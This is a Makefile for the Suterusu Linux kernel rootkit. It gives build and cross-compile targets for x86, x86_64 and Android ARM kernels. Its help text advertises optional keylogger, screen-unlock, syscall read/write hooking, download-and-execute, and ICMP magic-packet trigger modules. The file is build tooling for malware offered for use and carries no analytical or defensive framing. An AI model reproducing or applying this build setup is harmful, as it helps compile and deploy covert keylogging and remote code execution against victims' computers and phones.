obj-m += suterusu.o
suterusu-objs := main.o util.o

ifdef KEYLOGGER
	suterusu-objs += keylogger.o
	MODULES += -D_CONFIG_KEYLOGGER_
ifdef UNLOCK
	MODULES += -D_CONFIG_UNLOCK_
endif
endif

ifdef HOOKRW
	suterusu-objs += hookrw.o
	MODULES += -D_CONFIG_HOOKRW_
endif

ifdef DLEXEC
	suterusu-objs += dlexec.o
	MODULES += -D_CONFIG_DLEXEC_
ifdef ICMP
	suterusu-objs += icmp.o
	MODULES += -D_CONFIG_ICMP_
endif
endif

default:
	@echo "To build Suterusu:"
	@echo "  make TARGET KDIR=/path/to/kernel"
	@echo
	@echo "To build with additional modules:"
	@echo "  make TARGET KDIR=/path/to/kernel MODULE1=y MODULE2=y..."
	@echo
	@echo "To cross-compile:"
	@echo "  make TARGET CROSS_COMPILE=arm-linux-androideabi- KDIR=/path/to/kernel"
	@echo
	@echo "To clean the build dir:"
	@echo "  make clean KDIR=/path/to/kernel"
	@echo
	@echo "Supported targets:"
	@echo "linux-x86    	Linux, x86"
	@echo "linux-x86_64 	Linux, x86_64"
	@echo "android-arm  	Android Linux, ARM"
	@echo
	@echo "Supported modules:"
	@echo "KEYLOGGER    Monitor keystrokes"
	@echo "  UNLOCK     Unlock the screen upon given key sequence"
	@echo "HOOKRW       Hook sys_read and sys_write"
	@echo "DLEXEC       Download & execute a binary upon event"
	@echo "  ICMP       Monitor inbound ICMP for magic packet"

linux-x86:
ifndef KDIR
	@echo "Must provide KDIR!"
	@exit 1
endif
	$(MAKE) ARCH=x86 EXTRA_CFLAGS="-D_CONFIG_X86_ ${MODULES}" -C $(KDIR) M=$(PWD) modules

linux-x86_64:
ifndef KDIR
	@echo "Must provide KDIR!"
	@exit 1
endif
	$(MAKE) ARCH=x86_64 EXTRA_CFLAGS="-D_CONFIG_X86_64_ ${MODULES}" -C $(KDIR) M=$(PWD) modules

android-arm:
ifndef KDIR
	@echo "Must provide KDIR!"
	@exit 1
endif
	$(MAKE) ARCH=arm EXTRA_CFLAGS="-D_CONFIG_ARM_ -fno-pic ${MODULES}" -C $(KDIR) M=$(PWD) modules

clean:
ifndef KDIR
	@echo "Must provide KDIR!"
	@exit 1
endif
	$(MAKE) -C $(KDIR) M=$(PWD) clean
